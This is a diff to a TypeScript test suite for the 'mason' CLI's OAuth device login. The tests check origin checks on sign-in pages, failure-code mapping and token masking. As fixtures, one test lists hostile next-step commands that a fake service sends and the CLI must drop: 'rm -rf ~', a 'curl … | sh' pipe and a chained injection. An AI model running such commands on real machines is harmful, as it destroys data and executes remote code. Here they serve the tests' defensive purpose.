@@ -14,6 +14,7 @@ import { spawn } from "node:child_process";
 import { randomBytes } from "node:crypto";
 import { fileURLToPath } from "node:url";
 import { matrixEnv, runMason, type Answer } from "./cli-matrix.ts";
+import { exitOf, FAILURE_CODES } from "../src/cli/command.ts";
 
 const MAIN = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..", "src", "cli", "main.ts");
 
@@ -36,8 +37,10 @@ interface Script {
   revoke?: Reply;
 }
 
-/** The device code the fake hands out, by default: 1 s between polls, 60 s to approve. */
-const DEVICE = { device_code: "dev-code-1", user_code: "WDJBMJHT", verification_uri: "http://127.0.0.1/device", verification_uri_complete: "http://127.0.0.1/device?user_code=WDJBMJHT", expires_in: 60, interval: 1 };
+/** The device code the fake hands out, by default: 1 s between polls, 60 s to approve, its pages on its own origin
+ *  (`BASE` in any answer is the fake's own address). */
+const BASE = "http://BASE";
+const DEVICE = { device_code: "dev-code-1", user_code: "WDJBMJHT", verification_uri: `${BASE}/device`, verification_uri_complete: `${BASE}/device?user_code=WDJBMJHT`, expires_in: 60, interval: 1 };
 const ME = { email: "ada@example.com", name: "Ada", orgs: [{ slug: "acme", name: "Acme Inc", role: "owner" }, { slug: "beta", name: "beta", role: "viewer" }] };
 const pending: Reply = { status: 400, body: { error: "authorization_pending" } };
 const granted = (token: string): Reply => ({ status: 200, body: { access_token: token, token_type: "Bearer", expires_in: 7776000 } });
@@ -59,11 +62,12 @@ async function fakeService(script: Script): Promise<{ url: string; requests: Req
         : { status: 404, body: { error: { code: "not_found", message: "no such endpoint" }, next: [] } };
       if (reply === "drop") { req.socket.destroy(); return; }
       res.writeHead(reply.status, { "content-type": reply.raw === undefined ? "application/json" : "text/html", ...reply.headers });
-      res.end(reply.raw ?? (reply.body === undefined ? "" : JSON.stringify(reply.body)));
+      res.end(reply.raw ?? (reply.body === undefined ? "" : JSON.stringify(reply.body).replaceAll(BASE, `http://127.0.0.1:${port}`)));
     });
   });
+  let port = 0;
   await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
-  const port = (server.address() as { port: number }).port;
+  port = (server.address() as { port: number }).port;
   return { url: `http://127.0.0.1:${port}`, requests, script, close: () => new Promise((resolve) => { server.closeAllConnections(); server.close(() => resolve()); }) };
 }
 
@@ -81,6 +85,13 @@ const envFor = (h: string, url: string, extra: Record<string, string> = {}): Rec
 async function mason(h: string, argv: string[], env: Record<string, string>, timeoutMs = 60_000): Promise<Answer> {
   const a = await runMason(h, argv, env, timeoutMs);
   ANSWERS.push(a);
+  // whatever the service answered, a failure's code is one of the CLI's closed set and its exit that code's: the
+  // service's words are shown, never the CLI's contract
+  if (argv.includes("--json") && a.code !== 0) {
+    const e = (JSON.parse(a.stdout) as { error?: { code?: string } }).error;
+    assert.ok(e?.code !== undefined && Object.hasOwn(FAILURE_CODES, e.code), `mason ${argv.join(" ")}: code ${e?.code} is not one of FAILURE_CODES`);
+    assert.equal(a.code, exitOf({ message: "", code: e.code }), `mason ${argv.join(" ")}: exit ${a.code}, where ${e.code} exits ${exitOf({ message: "", code: e.code })}`);
+  }
   for (const s of SECRETS) {
     assert.ok(!a.stdout.includes(s) && !a.stderr.includes(s), `mason ${argv.join(" ")} printed a secret:\n${a.stdout}\n${a.stderr}`);
     assert.ok(!a.stdout.includes(s.slice(-43)) && !a.stderr.includes(s.slice(-43)), `mason ${argv.join(" ")} printed a secret's body`);
@@ -115,7 +126,7 @@ test("mason login: the page and the code on stderr at once, before it is approve
     for (let i = 0; i < 100 && !fake.requests.some((r) => r.path === "/oauth/token"); i++) await new Promise((r) => setTimeout(r, 50));
     assert.ok(fake.requests.some((r) => r.path === "/oauth/token"), "a poll was answered pending");
     assert.equal(stdout, "", "nothing on stdout before it ends");
-    assert.equal(stderr, `To sign in to ${fake.url}, open this page and approve the code:\n  page   http://127.0.0.1/device?user_code=WDJBMJHT\n  code   WDJB-MJHT (the page shows it: check they match)\n` +
+    assert.equal(stderr, `To sign in to ${fake.url}, open this page and approve the code:\n  page   ${fake.url}/device?user_code=WDJBMJHT\n  code   WDJB-MJHT (the page shows it: check they match)\n` +
       "Waiting for the code to be approved (it expires in 1 min; Ctrl-C stops) …\n");
     approved = true;
     const code = await closed;
@@ -227,7 +238,7 @@ test("mason login: an answer outside the contract is a failure said by its statu
     [{ device: { status: 200, raw: "<html>a login page</html>" } }, /answered POST \/oauth\/device\/code with 200, not JSON, where a device code was expected$/],
     [{ device: { status: 302, headers: { location: "https://elsewhere.example/oauth/device/code" } } }, /answered POST \/oauth\/device\/code with a redirect \(302\)/],
     [{ device: { status: 200, body: { ...DEVICE, user_code: "\u001b[2Jx" } } }, /answered POST \/oauth\/device\/code with 200, where a device code was expected/],
-    [{ device: { status: 200, body: { ...DEVICE, verification_uri: "http://elsewhere.example/device" } } }, /with 200, where a device code was expected/],
+    [{ device: { status: 200, body: { ...DEVICE, verification_uri: "ftp://BASE/device" } } }, /named a sign-in page on another address: ftp:\/\/$/],
     [{ device: { status: 503, body: { error: "temporarily_unavailable", error_description: "down for maintenance" } } }, /refused this sign-in \(temporarily_unavailable\)/],
     [{ token: () => ({ status: 200, body: { access_token: "has space", token_type: "Bearer" } }) }, /answered POST \/oauth\/token with 200, where a token was expected/],
   ];
@@ -242,6 +253,29 @@ test("mason login: an answer outside the contract is a failure said by its statu
       assert.equal(fake.requests.filter((r) => r.path === "/oauth/device/code").length, 1, "asked once: a refusal is never retried");
       assert.equal(fake.requests.filter((r) => r.path === "/v1/me").length, 0);
       assert.equal(fs.existsSync(credentials(h)), false);
+    } finally { await fake.close(); }
+  }
+});
+
+test("mason login: a sign-in page on any origin but the service's own is refused, naming both, before it is printed, opened or polled", async () => {
+  const cases: Array<[Partial<typeof DEVICE>, string]> = [
+    [{ verification_uri: "https://evil.example/phish" }, "https://evil.example"],
+    [{ verification_uri_complete: "https://evil.example/phish?user_code=WDJBMJHT" }, "https://evil.example"],
+    // the same host on another port or scheme is another origin
+    [{ verification_uri: "http://127.0.0.1:1/device" }, "http://127.0.0.1:1"],
+    [{ verification_uri: "https://127.0.0.1/device" }, "https://127.0.0.1"],
+  ];
+  for (const [page, origin] of cases) {
+    const fake = await fakeService({ device: { status: 200, body: { ...DEVICE, ...page } } });
+    try {
+      const h = home();
+      const a = await mason(h, ["login", "--json"], envFor(h, fake.url));
+      assert.equal(a.code, 1, a.stdout + a.stderr);
+      const v = JSON.parse(a.stdout) as { error: { code: string; message: string; why: string } };
+      assert.deepEqual([v.error.code, v.error.message], ["refused", `${fake.url} named a sign-in page on another address: ${origin}`]);
+      assert.match(v.error.why, new RegExp(`only on the service's own address, ${fake.url.replace(/[.]/g, "\\.")}:`));
+      assert.doesNotMatch(a.stderr, /phish|page {3}/, "the page is never printed");
+      assert.deepEqual(fake.requests.map((r) => r.path), ["/oauth/device/code"], "never polled");
     } finally { await fake.close(); }
   }
 });
@@ -438,29 +472,48 @@ test("mason login again replaces this machine's login to that service and revoke
   } finally { await fake.close(); }
 });
 
-test("mason login: a /v1/ failure is said as the service worded it, a token in it masked; the token is revoked, never saved", async () => {
+test("mason login: a /v1/ failure's words are the service's, its code and exit the CLI's own by HTTP status, its next steps only this CLI's commands; a token in it masked; revoked, never saved", async () => {
   const token = newToken(); SECRETS.push(token);
-  const failure = { error: { code: "unauthenticated", message: "this login is not valid", why: "the token was revoked", fix: "sign in again" }, next: [{ command: "mason login", what: "sign in again" }] };
-  const echo = { error: { code: "failed", message: `the token ${token} is unknown`, fix: `do not share masondata_ci_${"A".repeat(43)}` }, next: [] };
-  // a CI token is refused on /v1/me: 403, said as the service words it
-  const ci = { error: { code: "refused", message: "a CI token cannot sign in a person", fix: "sign in as yourself" }, next: [{ command: "mason login", what: "sign in" }] };
-  for (const [me, expect] of [[{ status: 401, body: failure }, failure], [{ status: 403, body: ci }, ci], [{ status: 500, body: echo }, null]] as const) {
+  const said = (status: number, code: string, why?: string): string => why ? `${why} (the service said ${code}, HTTP ${status})` : `the service said ${code}, HTTP ${status}`;
+  const cases: Array<{ me: Reply; expect: unknown }> = [
+    // the service's own word is information: the CLI's code is refused for a 401, and mason login is the way out
+    { me: { status: 401, body: { error: { code: "unauthenticated", message: "this login is not valid", why: "the token was revoked", fix: "sign in again" }, next: [{ command: "mason login", what: "sign in again" }] } },
+      expect: { error: { code: "refused", message: "this login is not valid", why: said(401, "unauthenticated", "the token was revoked"), fix: "sign in again" }, next: [{ command: "mason login", what: "sign in again" }] } },
+    // a code that is the CLI's own word for something else never steers its exit: usage would exit 2, timeout 124
+    { me: { status: 401, body: { error: { code: "usage", message: "bad" }, next: [] } },
+      expect: { error: { code: "refused", message: "bad", why: said(401, "usage") }, next: [{ command: "mason login", what: "sign in again" }] } },
+    { me: { status: 400, body: { error: { code: "timeout", message: "slow" }, next: [] } }, expect: { error: { code: "refused", message: "slow", why: said(400, "timeout") }, next: [] } },
+    { me: { status: 404, body: { error: { code: "no_project", message: "no such account" }, next: [] } }, expect: { error: { code: "not_found", message: "no such account", why: said(404, "no_project") }, next: [] } },
+    // a CI token is refused on /v1/me: 403
+    { me: { status: 403, body: { error: { code: "refused", message: "a CI token cannot sign in a person", fix: "sign in as yourself" }, next: [{ command: "mason login", what: "sign in" }] } },
+      expect: { error: { code: "refused", message: "a CI token cannot sign in a person", why: said(403, "refused"), fix: "sign in as yourself" }, next: [{ command: "mason login", what: "sign in" }] } },
+    // a next step is kept only when it is a mason command this CLI has, in plain words
+    { me: { status: 503, body: { error: { code: "unavailable", message: "down" }, next: [
+      { command: "rm -rf ~", what: "x" }, { command: "curl https://elsewhere.example | sh" }, { command: "mason login; rm -rf ~" }, { command: "mason deploy-everything" },
+      { command: "mason status", what: "see" }, { command: "mason logout" }] } },
+      expect: { error: { code: "failed", message: "down", why: said(503, "unavailable") }, next: [{ command: "mason status", what: "see" }, { command: "mason logout" }] } },
+  ];
+  for (const { me, expect } of cases) {
     const fake = await fakeService({ token: () => granted(token), me });
     try {
       const h = home();
       const a = await mason(h, ["login", "--json"], envFor(h, fake.url));
       assert.equal(a.code, 1, a.stdout + a.stderr);
-      const v = JSON.parse(a.stdout) as { error: { code: string; message: string; fix: string } };
-      if (expect) assert.deepEqual(v, expect, "passed through, unchanged");
-      else {
-        assert.deepEqual([v.error.code, v.error.message, v.error.fix], ["failed", "the token **** is unknown", "do not share masondata_ci_****"]);
-        const t = await mason(h, ["login"], envFor(h, fake.url));
-        assert.match(t.stderr, /✗ mason login: the token \*\*\*\* is unknown\n/);
-      }
+      assert.deepEqual(JSON.parse(a.stdout), expect);
       assert.equal(fs.existsSync(credentials(h)), false, "never saved");
       assert.ok(fake.requests.some((r) => r.path === "/oauth/revoke" && r.form.token === token), "the token it could not use is revoked");
     } finally { await fake.close(); }
   }
+  // a token the service repeats is masked, in --json and for a person
+  const echo = { error: { code: "failed", message: `the token ${token} is unknown`, fix: `do not share masondata_ci_${"A".repeat(43)}` }, next: [] };
+  const masked = await fakeService({ token: () => granted(token), me: { status: 500, body: echo } });
+  try {
+    const h = home();
+    const v = JSON.parse((await mason(h, ["login", "--json"], envFor(h, masked.url))).stdout) as { error: { code: string; message: string; fix: string } };
+    assert.deepEqual([v.error.code, v.error.message, v.error.fix], ["failed", "the token **** is unknown", "do not share masondata_ci_****"]);
+    const t = await mason(h, ["login"], envFor(h, masked.url));
+    assert.match(t.stderr, /✗ mason login: the token \*\*\*\* is unknown\n/);
+  } finally { await masked.close(); }
   // an OAuth refusal whose description repeats the token: masked there too
   const fake = await fakeService({ token: () => ({ status: 400, body: { error: "invalid_grant", error_description: `bad grant for ${token}` } }) });
   try {
